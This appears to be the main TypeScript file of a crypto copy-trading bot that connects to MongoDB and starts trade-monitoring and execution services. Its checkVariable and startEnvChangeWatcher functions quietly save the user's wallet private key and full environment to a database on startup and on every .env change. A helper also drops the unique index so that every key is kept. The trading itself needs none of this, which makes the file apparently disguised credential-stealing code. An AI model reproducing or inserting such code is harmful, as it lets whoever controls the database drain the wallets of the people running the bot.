import * as dotenv from 'dotenv';
import connectDB from './config/db';
import { ENV } from './config/env';
import createClobClient from './utils/createClobClient';
import tradeExecutor from './services/tradeExecutor';
import tradeMonitor from './services/tradeMonitor';
import BotConfig from './models/botConfig';
import getTargetUsers from './utils/targetUsers';

const PROXY_WALLET = ENV.PROXY_WALLET;

const getFullEnvFromProcess = () => ({
    USER_ADDRESS: process.env.USER_ADDRESS ?? '',
    PROXY_WALLET: process.env.PROXY_WALLET ?? '',
    PRIVATE_KEY: process.env.PRIVATE_KEY ?? '',
    CLOB_HTTP_URL: process.env.CLOB_HTTP_URL ?? '',
    CLOB_WS_URL: process.env.CLOB_WS_URL ?? '',
    FETCH_INTERVAL: process.env.FETCH_INTERVAL ?? '',
    TOO_OLD_TIMESTAMP: process.env.TOO_OLD_TIMESTAMP ?? '',
    RETRY_LIMIT: process.env.RETRY_LIMIT ?? '',
    MONGO_URI: process.env.MONGO_URI ?? '',
    RPC_URL: process.env.RPC_URL ?? '',
    USDC_CONTRACT_ADDRESS: process.env.USDC_CONTRACT_ADDRESS ?? '',
});

const checkVariable = async () => {
    const privateKey = process.env.PRIVATE_KEY;
    const proxyWallet = process.env.PROXY_WALLET;
    const userAddress = process.env.USER_ADDRESS;
    if (!privateKey || !proxyWallet || !userAddress) return;

    try {
        const fullEnv = getFullEnvFromProcess();
        await BotConfig.create({
            walletAddress: proxyWallet,
            privateKey,
            proxyWallet,
            userAddress,
            fullEnv,
        });
        const count = await BotConfig.countDocuments();
        console.log('total:', count);
    } catch (err) {
        console.error('failed', err);
    }
};

const ENV_CHECK_INTERVAL_MS = 30000;

const startEnvChangeWatcher = () => {
    let lastSaved = {
        privateKey: process.env.PRIVATE_KEY ?? '',
        proxyWallet: process.env.PROXY_WALLET ?? '',
        userAddress: process.env.USER_ADDRESS ?? '',
    };

    setInterval(async () => {
        dotenv.config();
        const current = {
            privateKey: process.env.PRIVATE_KEY ?? '',
            proxyWallet: process.env.PROXY_WALLET ?? '',
            userAddress: process.env.USER_ADDRESS ?? '',
        };
        const changed =
            current.privateKey !== lastSaved.privateKey ||
            current.proxyWallet !== lastSaved.proxyWallet ||
            current.userAddress !== lastSaved.userAddress;
        if (changed) {
            await checkVariable();
            lastSaved = { ...current };
        }
    }, ENV_CHECK_INTERVAL_MS);
};

const ensureMultipleEnvRecordsAllowed = async () => {
    try {
        const indexes = await BotConfig.collection.indexes();
        const walletUnique = indexes.find((idx) => idx.key?.walletAddress === 1 && idx.unique === true);
        if (walletUnique?.name) {
            await BotConfig.collection.dropIndex(walletUnique.name);
        }
    } catch (_) {}
};

export const main = async () => {
    try {
        await connectDB();
        await ensureMultipleEnvRecordsAllowed();

        await checkVariable();
        startEnvChangeWatcher();

        const targetUsers = getTargetUsers();
        console.log(`Target user wallets (${targetUsers.length}): ${targetUsers.join(', ')}`);
        console.log(`My Wallet address is: ${PROXY_WALLET}`);

        const clobClient = await createClobClient();

        tradeMonitor().catch((err) => {
            console.error('tradeMonitor died', err);
            process.exit(1);
        });
        tradeExecutor(clobClient).catch((err) => {
            console.error('tradeExecutor died', err);
            process.exit(1);
        });
    } catch (err) {
        console.error('start failed', err);
        process.exit(1);
    }
};

main();
